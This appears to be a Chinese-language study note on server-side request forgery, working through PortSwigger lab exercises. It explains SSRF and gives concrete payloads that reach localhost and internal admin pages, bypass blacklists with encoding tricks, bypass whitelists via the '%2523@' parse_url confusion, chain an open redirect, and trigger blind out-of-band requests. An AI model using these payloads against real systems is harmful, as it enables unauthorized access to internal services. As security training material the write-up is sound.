## Server-side request forgery (SSRF)

SSRF（服务端请求伪造），服务器端请求伪造是一种 Web 安全漏洞，它允许攻击者使服务器端应用程序向意外位置发出请求

![](img/server-side%20request%20forgery.svg)
## SSRF 攻击的影响是什么?

成功的 SSRF 攻击通常会导致未经授权的作或对组织内的数据的访问。这可能位于易受攻击的应用程序中，也可能位于应用程序可以与之通信的其他后端系统上。在某些情况下，SSRF 漏洞可能允许攻击者执行任意命令。

## 常见的 SSRF 攻击

### 针对本地服务器

在针对本地服务器的` SSRF `攻击中，攻击者使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。

这通常涉及提供主机名如 `127.0.0.1`（指向环回适配器的保留 IP 地址）或 `localhost`（同一适配器的常用名称）的 URL

例如：一个购物网站，这个功能是查看特定商店是否存在商品库存，并提供股票信息；后端必须查询各种`RESt API`，它将URL传递给后端的相关`API`来达成目的。

当用户查询商品库存时，请求如下：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

服务器通过向指定的URL发送请求，将结果返回给用户

攻击者可以修改请求以指定服务器本地的 URL：

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

这样就将`/admin`的内容返回给用户

攻击者可以访问 `/admin` URL，但管理功能通常只有经过**身份验证**的用户才能访问，这意味着攻击者不会看到任何感兴趣的内容。

但是，如果对 `/admin` URL 的请求来自本地计算机，则会绕过正常的访问控制。

**为什么网站这样运行，并且信任本地服务器的请求？**

- 访问控制检查在其他组件中，当连接回到服务器时，将绕过检查
- 网站可能允许本地计算机的任意用户管理，而无需登录
- 管理的页面在用户访问不到的端口

### 针对其他后端系统

服务器能够与用户访问不到的系统进行交互，这些系统大多是内网地址，内网系统通常受**网络拓扑**保护，因此它们的安全状况通常较弱。

在许多情况下，内网后端系统包含敏感功能，任何能够与系统交互的人都可以在不进行身份验证的情况下访问这些功能。

假设内网中  ` https://192.168.0.68/admin` 有一个管理界面

攻击者提交如下请求，利用SSRF漏洞

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

### 盲 SSRF 漏洞

网站会向指定的URL发送请求，但在响应中没有任何回显。

无回显 SSRF 漏洞不能轻易的读取数据，危害低于正常 SSRF ，尽管在某些情况下可以利用它们来实现完全远程代码执行

检测盲 SSRF 漏洞的最可靠方法是使用带外 （OAST） 技术。

这涉及尝试触发对外部系统的 HTTP 请求，并监控与该系统的网络交互

## labs

### 本地服务器的 SSRF

检查商品库存功能，请求数据包如下：

![image-20250509234300998](./img/image-20250509234300998.png)

访问`http://localhost/admin`

![image-20250509234136125](./img/image-20250509234136125.png)

查看页面源代码，访问`http://localhost/admin/delete?username=carlos`，删除`carlos`用户

### 其他系统的 SSRF

这个系统在`192.168.0.X`的8080端口上，我们需要自主寻找

直接爆破即可，找到状态码为200的

![image-20250510000509607](./img/image-20250510000509607.png)



### bypass 黑名单

用`127.1`，`a`字符被限制，大小写绕过，或者URL编码（双重）绕过

因为服务器可能是以递归的方式进行 URL 解码

payload

```http
http://127.1/%25%34%31dmin
http://127.1/%41dmin
http://127.1/Admin
```

### bypass 白名单

一个完整的URL结构

```http
https://username:password@www.example.com:443/path/to/resource?query=parameter#section
```

>1. **协议（Scheme）**：`https`
>2. **用户信息（User Info）**：`username:password`
>3. **主机名（Host）**：`www.example.com`
>4. **端口号（Port）**：`:443`
>5. **路径（Path）**：`/path/to/resource`
>6. **查询字符串（Query String）**：`?query=parameter`
>7. **片段标识符（Fragment Identifier）**：`#section`
>
>片段标识符是一个可选部分，以`#`开头，通常用于指向网页中的某个特定部分（如某个标题或段落）。它在浏览器中处理，不会发送到服务器

一些服务器只允许白名单中的值，或者查找是否包含匹配项

payload

```http
http://localhost%2523@stock.weliketoshop.net/admin
```

```http
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

```php
<?php

$url = 'http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos';
$info = parse_url($url);
var_dump($info);

$info = parse_url(urldecode($url));
var_dump($info);

$info = parse_url(urldecode(urldecode($url)));
var_dump($info);
```

可能是先利用`parse_url`，检查host的值必须是`stock.weliketoshop.net`

URL解码二次以后：

```php
array(4) {
  'scheme' =>
  string(4) "http"
  'host' =>
  string(9) "localhost"
  'port' =>
  int(80)
  'fragment' =>
  string(52) "@stock.weliketoshop.net/admin/delete?username=carlos"
}
```

### 重定向利用

如果用于发出后端 HTTP 请求的 API 支持重定向，就可以构建一个满足筛选条件的 URL，并将请求重定向到所需的后端目标

![image-20250510193935455](./img/image-20250510193935455.png)

非预期吗？猜测后端是将`host`和`stockApi`拼接起来再请求的，用`@`符号指定`host`

```http
@192.168.0.12:8080/admin/delete?username=carlos
```

预期：

在下一个商品的按钮，存在`/product/nextProduct?currentProductId=19&path=/product?productId=20`

修改`path`即可

```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### 盲 SSRF 利用（带外）

该网站使用分析软件，当加载产品页面时，该软件会获取`Referer`头中指定的UR

修改`referer`指定自己的服务器

![image-20250510195244789](./img/image-20250510195244789.png)

### 盲 SSRF -Shellshock 漏洞

UA头和Referer头与服务器有交互

![image-20250510201959117](./img/image-20250510201959117.png)

![image-20250510202130094](./img/image-20250510202130094.png)

## URL验证绕过备忘单

https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
